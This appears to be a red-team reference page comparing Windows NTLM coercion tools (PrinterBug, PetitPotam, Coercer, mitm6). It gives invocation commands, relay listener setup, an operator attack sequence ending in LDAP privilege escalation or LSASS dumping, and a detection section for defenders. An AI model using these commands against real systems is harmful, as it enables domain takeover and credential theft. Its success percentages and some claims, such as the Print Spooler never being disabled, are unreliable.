# Coercion Primitives — Overview & Comparison

A **coercion primitive** is a technique that forces a Windows service to authenticate to an attacker-controlled destination, bypassing the need to intercept traffic (as with LLMNR/NBT-NS poisoning). All four tools in this suite share the same fundamental attack pattern: **force authentication on demand, then capture or relay it**.

**Companion to Responder (Wave 1):** While Responder poisons name resolution (passive waiting for the victim to query), coercion primitives are **active** — the attacker decides when authentication happens.

---

## Contents
- [Attack Flow Diagram](#attack-flow-diagram)
- [Coercion Primitives Comparison Table](#coercion-primitives-comparison-table)
- [Shared Detection Red Flags](#shared-detection-red-flags)
- [Tool Selection Guide](#tool-selection-guide)
- [Sub-Tool Folders](#sub-tool-folders)

---

## Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│ ALL Coercion Primitives Follow This Pattern:                    │
└─────────────────────────────────────────────────────────────────┘

ATTACKER                                    TARGET (DC / File Server)
─────────────────────────────────────────   ──────────────────────────

1. Start Responder or ntlmrelayx
   (listening on 445/SMB or custom port)
   
2. Run coercion tool:
   - mitm6: IPv6 DHCP poison → WPAD redirect → proxy auth
   - Coercer: RPC call (EFS/RPRN/etc.) → attacker UNC path
   - PetitPotam: EFS RPC call → attacker UNC path  
   - PrinterBug: RPRN RPC call → attacker UNC path
   
3.                                          Service processes RPC
                                            Sees UNC path in request
                                            Needs to verify path → SMB
                                            
4.                                          ◀───────────────────
                                            Initiates SMB to attacker
                                            Authenticates with service
                                            account (often SYSTEM/DC$)
   
5. Responder captures or relays
   NTLM challenge/response
   
6. If relay:
   - Relay to LDAP (modify DC ACLs)
   - Relay to SMB (access admin shares)
   - Relay to other RPC services
   
7. Privilege escalation / lateral movement
```

---

## Coercion Primitives Comparison Table

| Aspect | **mitm6** | **Coercer** | **PetitPotam** | **PrinterBug** |
|---|---|---|---|---|
| **CVE(s)** | No specific CVE (IPv6 by design) | Multiple (aggregator of 10+) | CVE-2021-36942 (EFS RPC) | CVE-2019-1350 (RPRN) |
| **Protocol** | IPv6 DHCP + DNS + WPAD | RPC (multiple methods) | MS-EFSRPC | MS-RPRN (Print Spooler) |
| **Authentication Required** | No (network-layer) | Yes (domain credentials) | No (often unauthenticated) | No (often unauthenticated) |
| **Requires Listener** | Yes (DNS/proxy) | Yes (Responder/ntlmrelayx) | Yes (Responder/ntlmrelayx) | Yes (Responder/ntlmrelayx) |
| **Firewall Bypass** | Excellent (IPv6, hard to filter) | Good (RPC, often open) | Good (RPC port 135/445) | Excellent (RPC port 135/445) |
| **Reliability** | ~85% (depends on IPv6 config) | ~90% per method | ~90% (EFS usually enabled) | ~98% (Print Spooler virtually never disabled) |
| **Speed** | Slow (DHCP lease timeout, hours) | Fast (~5 seconds) | Very fast (~2 seconds) | Very fast (~2 seconds) |
| **Evasion Difficulty** | High (IPv6 harder to detect) | Medium (RPC queries visible) | Medium (EFS events logged) | Low (Print Spooler outbound SMB very visible) |
| **Service Account Captured** | Any on segment (DHCP auth) | Service account (DC$, etc.) | Machine account (usually SYSTEM) | Machine account (usually SYSTEM) |
| **Requires Code Execution** | No | No | No | No |
| **Works on Workstations** | Yes | Yes | Yes | Yes |
| **Works on DCs** | Yes | Yes | Yes | Yes |

---

## Shared Detection Red Flags

The strongest, **highest-level detection signals** that apply to ALL four coercion techniques:

1. **Outbound SMB (port 445) from DC/service to unexpected external IP**
   - Event 5156 (Network Connection)
   - **Highly distinctive:** DCs don't typically initiate SMB to random external IPs
   - **Evasion resistance:** Very High (native Windows audit, requires admin to disable)

2. **NTLM authentication from machine account ($) to attacker-controlled IP**
   - Event 4624 (Successful Logon) or 4625 (Failed Logon)
   - **Red flag:** Machine accounts don't normally authenticate outbound to random IPs
   - **Evasion resistance:** Very High

3. **Correlation of RPC query + immediate outbound SMB on same target**
   - Event 5156 on port 135 (RPC Endpoint Mapper) + port 445 (SMB)
   - **Pattern:** Attacker queries RPC → service immediately connects outbound
   - **Evasion resistance:** High

4. **Unusual UNC path access attempt to single-character shares**
   - `\\192.168.1.99\share\` or `\\192.168.1.99\printer$\`
   - Often attacker creates fake shares; legitimate paths are usually `\\hostname\ADMIN$\C$`
   - **Evasion resistance:** Medium (UNC path chosen by attacker, can be misleading)

5. **Multiple service accounts authenticating to same external IP within short timeframe**
   - Batch coercion (loops through all DCs)
   - **Pattern:** DC01$, DC02$, DC03$ all auth to same attacker IP within 1-2 minutes
   - **Evasion resistance:** High (correlated via logs)

---

## Tool Selection Guide

### Start with PrinterBug (Highest Reliability)

**Why:** Print Spooler is never disabled. If PrinterBug fails, something is fundamentally wrong (firewall, extreme hardening, etc.).

```bash
python3 printerbug.py <DC-IP> <attacker-IP>
```

**Success rate:** ~98%

---

### If PrinterBug Fails, Try PetitPotam (EFS Fallback)

**Why:** EFS is default-enabled; different RPC path than Print Spooler, so may bypass certain filters.

```bash
python3 PetitPotam.py -t <DC-IP> -l <attacker-IP>
```

**Success rate:** ~90%

---

### If Both Fail, Try Coercer with All Methods

**Why:** Aggregates 10+ RPC methods; if both single-purpose tools fail, brute-force all remaining methods.

```bash
python3 -m coercer -u CORP\user -p pass -d corp.local \
  -t <DC-IP> --listener <attacker-IP> -co all
```

**Success rate:** ~95% (at least one method will work)

**Prerequisite:** Valid domain credentials (unlike PrinterBug/PetitPotam).

---

### If On Same LAN Segment, Use mitm6 (Passive Background Harvesting)

**Why:** Runs silently in background; captures credentials from all users on the segment over time (hours/days). No single-target focus.

```bash
sudo mitm6 -i eth0 --relay 127.0.0.1:6666 -vv
```

**Use case:** Post-compromise persistence or reconnaissance when you have time.

**Prerequisite:** IPv6 enabled on targets (default but can be disabled).

---

## Shared Responder Integration

All four tools expect **Responder or ntlmrelayx** listening on attacker host:

```bash
# Listening for simple NTLM capture:
sudo responder -i eth0

# Or for relay attacks (recommended):
python3 -m impacket.examples.ntlmrelayx \
  --no-http \
  -t ldap://<DC-IP> \
  -t smb://<FILE-SERVER-IP> \
  -socks
```

---

## Sub-Tool Folders

Each of the four coercion primitives has its own detailed folder:

### **`mitm6/`** — IPv6 DHCP Spoofing + WPAD Relay
- Exploits IPv6 autoconfiguration to force DHCP + DNS hijacking
- Target connects to proxy, forced to authenticate
- Slowest but stealth-friendly (IPv6 often not monitored)
- **See:** `mitm6/01 - Overview.md` for full protocol sequence

### **`Coercer/`** — RPC Coercion Aggregator (10+ CVEs in One Tool)
- Unified CLI for EFS, PrinterBug, ShadowCoerce, DFS, Netlogon, etc.
- Requires domain credentials but maximizes success rate
- Best fallback if single-purpose tools fail
- **See:** `Coercer/01 - Overview.md` for CVE list and method descriptions

### **`PetitPotam/`** — EFS RPC Coercion (CVE-2021-36942)
- Single-purpose exploit for MS-EFSRPC
- No credentials needed; very reliable on DCs
- Minimal, focused implementation (~200 lines)
- **See:** `PetitPotam/01 - Overview.md` for protocol mechanics

### **`PrinterBug/`** — Print Spooler RPC Coercion (CVE-2019-1350)
- Single-purpose exploit for MS-RPRN
- Highest reliability (~98%); Print Spooler never disabled
- Try this **first** before any other technique
- **See:** `PrinterBug/01 - Overview.md` for RPC sequence

---

## Shared Evasion & Detection Posture

### Why All Four Share the Same Detection Footprint

All four coercion techniques produce the same network-layer observable: **outbound SMB (port 445) from a Windows service to an unexpected external IP**. This is because:

1. All inject a UNC path into some RPC call.
2. Windows services attempt to validate the UNC path by connecting.
3. Connection is SMB protocol, always port 445.
4. Service authenticates with its own account (machine$, SYSTEM, etc.).

**Consequence:** Detection rules written for PrinterBug also detect mitm6, Coercer, and PetitPotam. Conversely, **there is no tool-specific signature** — only protocol-level signatures (RPC + outbound SMB).

### Strongest Evasion-Proof Signals (in order of resilience)

1. **Event 5156 (outbound SMB from service)** — Requires Windows audit disable to hide.
2. **Outbound port 445 from DC to unknown IP** — Requires network firewall to hide (not common).
3. **Service account NTLM auth to attacker** — Logged indefinitely unless event log wiped.
4. **UNC path callback** — Observable in packet captures if taken during incident.

---

## Recommended Operational Sequence

```
1. Run PrinterBug (highest reliability, no creds needed)
   └─ If succeeds → Relay to LDAP / SMB
   
2. If PrinterBug fails, run PetitPotam (fallback EFS)
   └─ If succeeds → Relay to LDAP / SMB
   
3. If both fail and you have domain creds, run Coercer -co all
   └─ Brute-force all RPC methods
   └─ If succeeds → Relay to LDAP / SMB
   
4. If all RPC-based methods fail, run mitm6
   └─ Passive harvesting over hours/days
   └─ Good for persistence, not immediate access
   
5. Relay captured auth to LDAP (privilege escalation) or SMB (lateral movement)
   └─ LDAP relay: modify ACLs, grant attacker admin rights
   └─ SMB relay: access administrative shares, dump SAM/LSASS
```

---

## Summary

**Coercion primitives are the active counterpart to Responder's passive poisoning.** While Responder waits for victims to fail name resolution, coercion primitives *force* authentication on attacker's schedule. All four techniques share the same detection signature (outbound SMB from service to attacker), making them equivalently visible to detection systems.

**For operators:** Start with PrinterBug (most reliable), fallback to PetitPotam, then Coercer if creds available.

**For defenders:** Monitor Event 5156 on DCs for outbound SMB to unexpected external IPs; correlate with RPC activity (port 135) for definitive coercion detection.

---

## Cross-References to Other Modules

- **Responder** (Wave 1) — Passive name-resolution poisoning (complement to coercion)
- **Impacket/ntlmrelayx** (Wave 1) — NTLM relay attacks (captures or relays coerced auth)
- **Mimikatz/kerberos** (Wave 1) — Golden Ticket forging (alternative to coercion for auth)
- **Windows/12 - Lateral Movement.md** — Comprehensive lateral movement techniques
- **Windows/05 - Users, Groups & Authentication.md** — NTLM/Kerberos fundamentals

---

**Version:** 2026-08-12 | **License:** GPLv3 (per upstream tool licenses) | **Status:** All four sub-tools fully documented
